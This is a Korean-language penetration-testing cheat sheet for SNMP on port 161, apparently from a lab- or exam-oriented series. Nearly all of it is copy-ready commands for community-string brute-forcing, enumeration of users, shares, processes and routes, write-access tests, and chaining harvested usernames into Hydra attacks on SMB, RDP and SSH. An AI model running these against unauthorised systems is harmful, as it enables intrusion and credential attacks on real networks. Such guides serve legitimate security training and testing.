# 📊 SNMP ATTACKS (Port 161)

> **목표: SNMP 서비스 발견 후 15-20분 내에 시스템 정보 완전 수집 및 중요 정보 추출**

## ⚡ 즉시 실행할 명령어들

### 🚀 SNMP 발견 즉시 실행

```bash
# 1. SNMP UDP 포트 확인
nmap -sU -p 161 {IP}
nmap -sU --open -p 161 {IP}

# 2. 기본 커뮤니티 스트링 테스트
snmpwalk -c public -v1 {IP}
snmpwalk -c private -v1 {IP}
snmpget -c public -v1 {IP} 1.3.6.1.2.1.1.1.0

# 3. onesixtyone으로 빠른 커뮤니티 스트링 스캔
onesixtyone {IP}
onesixtyone -c community.txt {IP}

# 4. SNMP NSE 스크립트 실행 (백그라운드)
nmap --script snmp-* -sU -p 161 {IP} &

# 5. 시스템 기본 정보 즉시 확인
snmpget -c public -v1 {IP} 1.3.6.1.2.1.1.1.0
snmpget -c public -v1 {IP} 1.3.6.1.2.1.1.5.0
```

### ⚡ 중요 정보 즉시 수집 (public 접근 가능시)

```bash
# 시스템 정보
snmpwalk -c public -v1 {IP} 1.3.6.1.2.1.1

# 네트워크 인터페이스
snmpwalk -c public -v1 {IP} 1.3.6.1.2.1.2.2.1.2

# 실행 중인 프로세스
snmpwalk -c public -v1 {IP} 1.3.6.1.2.1.25.1.6.0

# 설치된 소프트웨어
snmpwalk -c public -v1 {IP} 1.3.6.1.2.1.25.2.1.2
```

---

## 📋 단계별 체크리스트

### 🎯 Phase 1: 발견 및 기본 정보 수집 (5분)

- [ ] **SNMP UDP 포트 확인** `nmap -sU -p 161 {IP}`
- [ ] **SNMP 버전 확인** (v1, v2c, v3)
- [ ] **기본 커뮤니티 스트링 테스트** (public, private)
- [ ] **SNMP 응답 확인** `snmpget 1.3.6.1.2.1.1.1.0`
- [ ] **시스템 기본 정보 수집**

### 🔍 Phase 2: 커뮤니티 스트링 확인 (5분)

- [ ] **일반적인 커뮤니티 스트링 시도** `onesixtyone`
- [ ] **커뮤니티 스트링 브루트포스**
- [ ] **SNMP v3 확인** (사용자명/패스워드 기반)
- [ ] **쓰기 권한 확인** (private 커뮤니티)
- [ ] **접근 가능한 OID 범위 확인**

### 📊 Phase 3: 정보 열거 및 수집 (8분)

- [ ] **시스템 정보 완전 수집** (OS, 버전, 하드웨어)
- [ ] **네트워크 정보 수집** (인터페이스, 라우팅 테이블)
- [ ] **프로세스 및 서비스 정보**
- [ ] **사용자 계정 정보** (Windows)
- [ ] **설치된 소프트웨어 목록**

### 🎯 Phase 4: 중요 정보 분석 및 활용 (2분)

- [ ] **수집된 정보 분석**
- [ ] **취약점 가능성 식별**
- [ ] **다른 서비스 공격에 활용할 정보 정리**
- [ ] **다음 공격 우선순위 결정**

---

## 🎯 상황별 대응

### 🔓 기본 커뮤니티 스트링 접근 (public/private)

```bash
# public 커뮤니티로 기본 정보 수집
snmpwalk -c public -v1 {IP} 1.3.6.1.2.1.1
snmpwalk -c public -v2c {IP} 1.3.6.1.2.1.1

# private 커뮤니티로 쓰기 권한 확인
snmpset -c private -v1 {IP} 1.3.6.1.2.1.1.6.0 s "Test Location"

# 다양한 커뮤니티 스트링 시도
community_strings="public private manager admin administrator guest user default cisco"
for community in $community_strings; do
    echo "Testing community: $community"
    snmpget -c $community -v1 {IP} 1.3.6.1.2.1.1.1.0 2>/dev/null
done
```

### 📋 커뮤니티 스트링 브루트포스

```bash
# onesixtyone을 이용한 빠른 스캔
onesixtyone {IP}
onesixtyone -c /usr/share/wordlists/metasploit/snmp_default_pass.txt {IP}

# 커스텀 커뮤니티 리스트 생성
echo -e "public\nprivate\ncisco\nmanager\nadmin\nroot\ndefault\nguest\nuser\npassword\nsecret\nmonitor\nreadonly\nreadwrite" > community.txt
onesixtyone -c community.txt {IP}

# Hydra를 이용한 브루트포스
hydra -P community.txt {IP} snmp

# nmap NSE 스크립트
nmap --script snmp-brute -sU -p 161 {IP}
```

### 🖥️ 시스템 정보 수집 (OID별)

```bash
# 기본 시스템 정보
snmpget -c public -v1 {IP} 1.3.6.1.2.1.1.1.0    # 시스템 설명
snmpget -c public -v1 {IP} 1.3.6.1.2.1.1.2.0    # 시스템 OID
snmpget -c public -v1 {IP} 1.3.6.1.2.1.1.3.0    # 시스템 가동 시간
snmpget -c public -v1 {IP} 1.3.6.1.2.1.1.4.0    # 시스템 연락처
snmpget -c public -v1 {IP} 1.3.6.1.2.1.1.5.0    # 시스템 이름 (호스트명)
snmpget -c public -v1 {IP} 1.3.6.1.2.1.1.6.0    # 시스템 위치

# 전체 시스템 정보 트리
snmpwalk -c public -v1 {IP} 1.3.6.1.2.1.1

# 하드웨어 정보
snmpwalk -c public -v1 {IP} 1.3.6.1.2.1.25.3.2.1.3    # 저장 장치
snmpwalk -c public -v1 {IP} 1.3.6.1.2.1.25.3.3.1.2    # 프로세서 정보
```

### 🌐 네트워크 정보 수집

```bash
# 네트워크 인터페이스 정보
snmpwalk -c public -v1 {IP} 1.3.6.1.2.1.2.2.1.1     # 인터페이스 인덱스
snmpwalk -c public -v1 {IP} 1.3.6.1.2.1.2.2.1.2     # 인터페이스 설명
snmpwalk -c public -v1 {IP} 1.3.6.1.2.1.2.2.1.6     # MAC 주소
snmpwalk -c public -v1 {IP} 1.3.6.1.2.1.4.20.1.1    # IP 주소

# 라우팅 테이블
snmpwalk -c public -v1 {IP} 1.3.6.1.2.1.4.21.1.1    # 목적지 네트워크
snmpwalk -c public -v1 {IP} 1.3.6.1.2.1.4.21.1.7    # 다음 홉
snmpwalk -c public -v1 {IP} 1.3.6.1.2.1.4.21.1.2    # 라우팅 유형

# ARP 테이블
snmpwalk -c public -v1 {IP} 1.3.6.1.2.1.4.22.1.2    # IP 주소
snmpwalk -c public -v1 {IP} 1.3.6.1.2.1.4.22.1.3    # MAC 주소

# TCP 연결 정보
snmpwalk -c public -v1 {IP} 1.3.6.1.2.1.6.13.1.1    # 로컬 주소
snmpwalk -c public -v1 {IP} 1.3.6.1.2.1.6.13.1.3    # 원격 주소
snmpwalk -c public -v1 {IP} 1.3.6.1.2.1.6.13.1.5    # 연결 상태
```

### 🔧 프로세스 및 서비스 정보

```bash
# 실행 중인 프로세스
snmpwalk -c public -v1 {IP} 1.3.6.1.2.1.25.1.6.0    # 프로세스 목록
snmpwalk -c public -v1 {IP} 1.3.6.1.2.1.25.4.2.1.1  # 프로세스 ID
snmpwalk -c public -v1 {IP} 1.3.6.1.2.1.25.4.2.1.2  # 프로세스 이름
snmpwalk -c public -v1 {IP} 1.3.6.1.2.1.25.4.2.1.4  # 프로세스 경로
snmpwalk -c public -v1 {IP} 1.3.6.1.2.1.25.4.2.1.5  # 프로세스 매개변수

# 설치된 소프트웨어
snmpwalk -c public -v1 {IP} 1.3.6.1.2.1.25.2.1.2    # 설치된 소프트웨어 이름
snmpwalk -c public -v1 {IP} 1.3.6.1.2.1.25.2.1.3    # 소프트웨어 ID

# 서비스 정보 (Windows)
snmpwalk -c public -v1 {IP} 1.3.6.1.4.1.77.1.2.3    # 서비스 이름
snmpwalk -c public -v1 {IP} 1.3.6.1.4.1.77.1.2.3.1  # 서비스 상태
```

### 👥 Windows 사용자 정보 수집

```bash
# 사용자 계정 (Windows 전용)
snmpwalk -c public -v1 {IP} 1.3.6.1.4.1.77.1.2.25   # 사용자 계정

# 공유 폴더 (Windows)
snmpwalk -c public -v1 {IP} 1.3.6.1.4.1.77.1.2.27   # 공유 폴더 이름

# 로그온 세션 (Windows)
snmpwalk -c public -v1 {IP} 1.3.6.1.4.1.77.1.2.28   # 로그온 세션

# 그룹 정보 (Windows)
snmpwalk -c public -v1 {IP} 1.3.6.1.4.1.77.1.2.26   # 그룹 정보

# 도메인 정보 (Windows)
snmpwalk -c public -v1 {IP} 1.3.6.1.4.1.77.1.4.1    # 도메인 컨트롤러
```

---

## 🚨 문제 해결

### 🚫 SNMP 응답이 없을 때

```bash
# UDP 포트 상태 재확인
nmap -sU -p 161 {IP} --reason
nmap -sU -p 161 {IP} -Pn

# 다른 SNMP 포트 확인
nmap -sU -p 161,162,199,1161 {IP}

# SNMP 버전별 시도
snmpget -c public -v1 {IP} 1.3.6.1.2.1.1.1.0
snmpget -c public -v2c {IP} 1.3.6.1.2.1.1.1.0
snmpget -c public -v3 {IP} 1.3.6.1.2.1.1.1.0

# 타임아웃 조정
snmpget -c public -v1 {IP} 1.3.6.1.2.1.1.1.0 -t 5 -r 3
```

### 🔒 커뮤니티 스트링 접근 실패시

```bash
# 더 많은 커뮤니티 스트링 시도
common_communities="public private manager admin administrator root guest user default cisco snmp monitor readonly readwrite secret password"
for community in $common_communities; do
    echo "Testing: $community"
    timeout 3 snmpget -c $community -v1 {IP} 1.3.6.1.2.1.1.1.0 2>/dev/null && echo "SUCCESS: $community"
done

# SNMP v3 사용자명 확인
nmap --script snmp-brute -sU -p 161 {IP}

# 다른 네트워크 인터페이스로 시도
snmpget -c public -v1 {IP} 1.3.6.1.2.1.1.1.0 -L o,snmptrap,{OTHER_IP}
```

### 📊 정보가 제한적일 때

```bash
# 전체 MIB 트리 스캔
snmpwalk -c public -v1 {IP} 1

# 특정 브랜치별 상세 스캔
snmpwalk -c public -v1 {IP} 1.3.6.1.2    # 인터넷 관리 브랜치
snmpwalk -c public -v1 {IP} 1.3.6.1.4    # 기업별 브랜치

# 벤더별 특화 OID 시도
# Cisco
snmpwalk -c public -v1 {IP} 1.3.6.1.4.1.9

# Microsoft
snmpwalk -c public -v1 {IP} 1.3.6.1.4.1.311

# HP
snmpwalk -c public -v1 {IP} 1.3.6.1.4.1.11

# Dell
snmpwalk -c public -v1 {IP} 1.3.6.1.4.1.674
```

### 🐌 SNMP 응답이 느릴 때

```bash
# 타임아웃과 재시도 조정
snmpwalk -c public -v1 {IP} 1.3.6.1.2.1.1 -t 1 -r 1

# 병렬 처리로 빠른 수집
#!/bin/bash
oids=("1.3.6.1.2.1.1.1.0" "1.3.6.1.2.1.1.5.0" "1.3.6.1.2.1.25.1.6.0")
for oid in "${oids[@]}"; do
    snmpget -c public -v1 {IP} $oid &
done
wait

# snmpenum 사용 (더 빠른 도구)
snmpenum {IP} public
```

### 🔧 도구 설치 문제

```bash
# 필요한 패키지 설치
sudo apt update
sudo apt install snmp snmp-mibs-downloader
sudo apt install onesixtyone

# MIB 데이터베이스 다운로드
sudo download-mibs

# snmp.conf 설정
echo "mibs +ALL" >> ~/.snmp/snmp.conf
```

---

## 🔗 다른 서비스와 연계

### 👥 수집한 사용자 정보 활용

```bash
# SNMP에서 수집한 Windows 사용자로 다른 서비스 공격
snmpwalk -c public -v1 {IP} 1.3.6.1.4.1.77.1.2.25 | grep STRING | cut -d'"' -f2 > snmp_users.txt

# 수집한 사용자로 SMB 브루트포스
hydra -L snmp_users.txt -P passwords.txt smb://{IP}

# RDP 브루트포스
hydra -L snmp_users.txt -P passwords.txt rdp://{IP}

# SSH 브루트포스 (Linux인 경우)
hydra -L snmp_users.txt -P passwords.txt ssh://{IP}
```

### 🌐 네트워크 정보 활용

```bash
# SNMP에서 발견한 다른 IP 주소들 스캔
snmpwalk -c public -v1 {IP} 1.3.6.1.2.1.4.20.1.1 | grep INTEGER | cut -d: -f4 | tr -d ' ' > discovered_ips.txt
nmap -sn -iL discovered_ips.txt

# 라우팅 테이블에서 내부 네트워크 발견
snmpwalk -c public -v1 {IP} 1.3.6.1.2.1.4.21.1.1
# 발견된 네트워크 대역 스캔
nmap -sn 192.168.0.0/24

# ARP 테이블에서 활성 호스트 확인
snmpwalk -c public -v1 {IP} 1.3.6.1.2.1.4.22.1.2
```

### 🔧 프로세스 정보 활용

```bash
# 실행 중인 서비스에서 취약점 서비스 확인
snmpwalk -c public -v1 {IP} 1.3.6.1.2.1.25.4.2.1.2 | grep -i "apache\|mysql\|ftp\|ssh\|smb"

# 설치된 소프트웨어에서 취약한 버전 확인
snmpwalk -c public -v1 {IP} 1.3.6.1.2.1.25.2.1.2 | grep -i "version\|v\."
```

### 📁 공유 폴더 정보 활용 (Windows)

```bash
# SNMP에서 발견한 공유 폴더에 접근 시도
snmpwalk -c public -v1 {IP} 1.3.6.1.4.1.77.1.2.27 | grep STRING | cut -d'"' -f2 > shares.txt

# 발견한 공유 폴더들에 접근
while read share; do
    echo "Testing share: $share"
    smbclient //{IP}/$share -N
done < shares.txt
```

---

## 🛠️ 고급 SNMP 기법

### 📝 SNMP 정보 자동 수집 스크립트

```bash
#!/bin/bash
IP=$1
COMMUNITY=${2:-public}

echo "=== SNMP Information Gathering for $IP ==="

# 시스템 기본 정보
echo "[+] System Information:"
snmpget -c $COMMUNITY -v1 $IP 1.3.6.1.2.1.1.1.0 1.3.6.1.2.1.1.5.0 2>/dev/null

# 네트워크 인터페이스
echo "[+] Network Interfaces:"
snmpwalk -c $COMMUNITY -v1 $IP 1.3.6.1.2.1.2.2.1.2 2>/dev/null

# 실행 중인 프로세스
echo "[+] Running Processes:"
snmpwalk -c $COMMUNITY -v1 $IP 1.3.6.1.2.1.25.1.6.0 2>/dev/null

# Windows 사용자 (시도)
echo "[+] Windows Users (if applicable):"
snmpwalk -c $COMMUNITY -v1 $IP 1.3.6.1.4.1.77.1.2.25 2>/dev/null

echo "=== SNMP Scan Complete ==="
```

### 🔍 SNMP 취약점 확인

```bash
# SNMP 버전 1,2c는 기본적으로 취약 (커뮤니티 스트링 평문 전송)
nmap --script snmp-info -sU -p 161 {IP}

# 기본 커뮤니티 스트링 사용 확인
if snmpget -c public -v1 {IP} 1.3.6.1.2.1.1.1.0 >/dev/null 2>&1; then
    echo "WARNING: Default community string 'public' is accessible!"
fi

# 쓰기 권한 확인 (위험)
snmpset -c private -v1 {IP} 1.3.6.1.2.1.1.6.0 s "HACKED" 2>/dev/null && echo "WARNING: Write access available!"
```

---

## ⏱️ 시간 관리 가이드

### 🎯 5분 안에 완료할 것들

- [ ] SNMP UDP 포트 확인
- [ ] 기본 커뮤니티 스트링 테스트 (public, private)
- [ ] 시스템 기본 정보 수집 (호스트명, OS)
- [ ] onesixtyone으로 빠른 커뮤니티 스캔

### 🔍 15분 안에 완료할 것들

- [ ] 모든 주요 OID 정보 수집 완료
- [ ] 네트워크 정보 및 프로세스 정보 수집
- [ ] Windows 환경시 사용자/공유 정보 수집
- [ ] 발견된 정보의 중요도 분석

### 💥 20분 후 판단 기준

**성공 기준:**

- [ ] 시스템 구조 및 서비스 완전 파악
- [ ] 사용자 계정 정보 수집 (Windows)
- [ ] 네트워크 구조 및 다른 호스트 발견
- [ ] 다른 서비스 공격에 활용할 정보 충분히 수집

**실패시 다음 단계:**

- [ ] 수집한 최소한의 정보라도 다른 공격에 활용
- [ ] 커뮤니티 스트링 브루트포스를 백그라운드로 계속 실행
- [ ] 다른 포트/서비스로 우선순위 이동
- [ ] SNMP 정보를 통해 발견한 다른 호스트들 스캔

**다음 단계**:

- 사용자 정보 수집시 해당 정보로 SMB/RDP/SSH 브루트포스
- 네트워크 정보 발견시 내부 네트워크 스캔
- 취약한 서비스 발견시 해당 서비스 집중 공격
- 실패시 다른 `PORT-ATTACKS/` 파일로 이동
